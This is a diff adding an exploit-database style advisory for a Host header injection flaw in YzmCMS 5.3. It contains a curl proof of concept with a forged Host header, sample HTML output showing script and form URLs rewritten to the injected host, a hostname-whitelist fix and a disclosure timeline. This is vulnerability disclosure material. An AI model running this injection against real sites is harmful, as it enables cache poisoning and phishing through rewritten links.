@@ -1,0 +1,83 @@
+# Exploit Title: YzmCMS 5.3 - 'Host' Header Injection
+# Exploit Author: Debashis Pal
+# Vendor Homepage: http://www.yzmcms.com/
+# Source: https://github.com/yzmcms/yzmcms
+# Version: YzmCMS V5.3
+# CVE : N/A
+# Tested on: Windows 7 SP1(64bit),XAMPP: 7.3.9
+
+#About YzmCMS
+==============
+YzmCMS is a lightweight open source content management system that uses OOP (Object Oriented) to develop its own framework.
+
+#Vulnerability 
+===============
+Host Header Injection.
+
+
+#PoC 
+=====
+#YzmCMS V5.3 Access Path: TARGET/yzmcms/
+
+curl http://TARGET/yzmcms/ -H "Host: www.google.com" 
+
+//sample output start
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+  <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	  <title>YzmCMS - 演示站</title>
+	  <link href="http://www.google.com/yzmcms/common/static/css/default_common.css" rel="stylesheet" type="text/css" />
+	  <link href="http://www.google.com/yzmcms/common/static/css/default_index.css" rel="stylesheet" type="text/css" />
+	  <script type="text/javascript" src="http://www.google.com/yzmcms/common/static/js/jquery-1.8.2.min.js"></script>
+	  <script type="text/javascript" src="http://www.google.com/yzmcms/common/static/js/js.js"></script>
+	  <script type="text/javascript" src="http://www.google.com/yzmcms/common/static/js/koala.min.1.5.js"></script> <!-- 焦点图js -->
+	  <meta name="keywords" content="yzmcms,YzmCMS演示站,yzmcms站点" />
+	  <meta name="description" content="本站是yzmcms演示站点" />
+	  <meta http-equiv="mobile-agent" content="format=xhtml;url=http://TARGET/yzmcms/index.php?m=mobile">
+      <script type="text/javascript">if(window.location.toString().indexOf('pref=padindex') != -1){}else{if(/AppleWebKit.*Mobile/i.test(navigator.userAgent) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(navigator.userAgent))){if(window.location.href.indexOf("?mobile")<0){try{if(/Android|Windows Phone|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)){window.location.href="http://TARGET/yzmcms/index.php?m=mobile";}else if(/iPad/i.test(navigator.userAgent)){}else{}}catch(e){}}}}</script>
+  </head>
+  <body>
+	   <!--mini登陆条-->
+<div id="head_login">
+<div class="w1000">
+<div id="mini">
+<a href="http://www.google.com/yzmcms/member/index/register.html" target="_blank">注册</a> <a href="http://www.google.com/yzmcms/member/index/login.html"  target="_blank">登录</a>
+</div>
+欢迎光临本站！
+</div>
+</div>
+<!--网站容器-->
+<div id="container">
+<div id="header">
+	<div id="logo">
+	 <a href="http://TARGET/yzmcms/"><img src="http://www.google.com/yzmcms/common/static/images/logo.png" title="YzmCMS - 演示站" alt="YzmCMS - 演示站"></a>
+	</div>
+	<div id="search">
+	<form method="get" action="http://www.google.com/yzmcms/index.php" target="_blank">
+		<div id="searchtxt" class="searchtxt">
+			<div class="searchmenu">	
+			
+
+//sample output End
+
+
+#Solution
+==========
+Don’t trust the host header. Only allow whitelist hostnames. 
+
+
+#Disclosure Timeline
+====================
+Vulnerability Discover Date: 18-Sep-2019
+Vulnerability Notification To vendor via Email: 18-Sep-2019, no responds
+Open issue in github : 22-Sep-2019, no responds
+Submit exploit-db : 25-Sep-2019
+
+
+#Disclaimer
+==========
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information.
+The author prohibits any malicious use of security related information or exploits by the author or elsewhere.
